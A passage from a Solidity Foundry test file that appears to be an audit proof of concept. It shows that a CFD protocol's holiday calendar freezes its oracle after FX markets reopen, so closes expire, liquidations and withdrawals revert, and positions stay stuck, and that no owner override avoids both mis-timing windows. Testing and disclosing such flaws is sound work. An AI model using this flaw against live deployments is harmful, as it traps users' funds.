            vm.warp(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds());
            vm.roll(vm.getBlockNumber() + 1);
            vm.prank(KEEPER);
            OrderV3Types.ExecutionResult memory expired = router.executeOrder(orderId, new bytes[](0));
            assertEq(uint8(expired.terminalReason), uint8(OrderV3Types.TerminalReason.Expired), "close expires");

            // Liquidation path reverts on stale data.
            vm.prank(KEEPER);
            (bool liqOk, bytes memory liqErr) = address(router)
                .call(abi.encodeWithSignature("executeLiquidation(address,bytes[])", HOLDER, new bytes[](0)));
            assertFalse(liqOk, "liquidation reverts");
            emit log_named_bytes("  liquidation revert", liqErr);

            // Positioned withdrawal reverts (fresh-mark requirement).
            vm.prank(HOLDER);
            (bool wOk, bytes memory wErr) =
                address(clearinghouse).call(abi.encodeWithSignature("withdraw(address,uint256)", HOLDER, 1e6));
            assertFalse(wOk, "positioned withdrawal reverts");
            emit log_named_bytes("  withdraw revert", wErr);
        }
        (uint256 size,,,,,,) = engine.positions(HOLDER);
        assertEq(size, SIZE, "position stuck open through the closed day");
    }

    /// Weekend contrast: the recurring calendar reopens at the exact 17:00 NY boundary, so 22:30 UTC on Sunday is
    /// already live (no stale-mark window); the holiday path is frozen at the same wall-clock offset.
    function test_Control_WeekendReopenIsLiveAtSameOffset() public {
        _setUpEve();
        vm.warp(SUN_DEC28 + 21 hours + 30 minutes);
        assertTrue(engine.isOracleFrozen(), "Sunday before the 22:00 UTC reopen: frozen");
        vm.warp(SUN_DEC28 + 22 hours + 30 minutes);
        assertFalse(engine.isOracleFrozen(), "Sunday 30 min after reopen: live");
        vm.warp(DEC25 + 22 hours + 30 minutes);
        assertTrue(engine.isOracleFrozen(), "holiday 30 min after reopen: still frozen");
    }

    /// Owner cannot avoid W2 without creating W1: every override subset of {Dec24, Dec25, Dec26}, evaluated with the
    /// production planner used by CfdEngine._marketStatus, is wrong at one of the three FX-truth checkpoints.
    function test_OverrideSweep_NoAllowedSettingAvoidsBothW1AndW2() public {
        CfdEnginePlanner planner = CfdEnginePlanner(address(engine.planner()));
        uint256 runway = 1 hours; // release fadRunwaySeconds
        // FX truth: closed Dec 24 22:00 -> Dec 25 22:00 UTC; open otherwise.
        // Probes: Dec 24 12:00 (open), Dec 24 22:30 (closed), Dec 25 12:00 (closed), Dec 25 22:30 (reopened).
        uint256[4] memory probes =
            [DEC24 + 12 hours, DEC24 + 22 hours + 30 minutes, DEC25 + 12 hours, DEC25 + 22 hours + 30 minutes];
        bool[4] memory fxClosed = [false, true, true, false];
        uint256 days0 = DEC24 / 1 days;

        for (uint256 mask; mask < 8; ++mask) {
            bool w1; // calendar live while FX is closed (no ticks)
            bool w2; // calendar frozen while FX is open (stale-mark settlement)
            for (uint256 p; p < 4; ++p) {
                uint256 day = probes[p] / 1 days;
                bool today = _inMask(mask, day - days0);
                bool tomorrow = _inMask(mask, day + 1 - days0);
                (, bool frozen) = planner.marketCalendarStatus(probes[p], today, tomorrow, runway);
                if (fxClosed[p] && !frozen) {
                    w1 = true;
                }
                if (!fxClosed[p] && frozen) {
                    w2 = true;
                }
            }
            emit log_named_uint("override mask (bit0=Dec24,bit1=Dec25,bit2=Dec26)", mask);
            emit log_named_string("  result", w1 && w2 ? "W1+W2" : w1 ? "W1" : w2 ? "W2" : "OK");
            assertTrue(w1 || w2, "some setting aligns with FX hours");
        }
    }

    function _inMask(
        uint256 mask,
        uint256 offset
    ) private pure returns (bool) {
        return offset < 3 && (mask >> offset) & 1 == 1;
    }

}

```
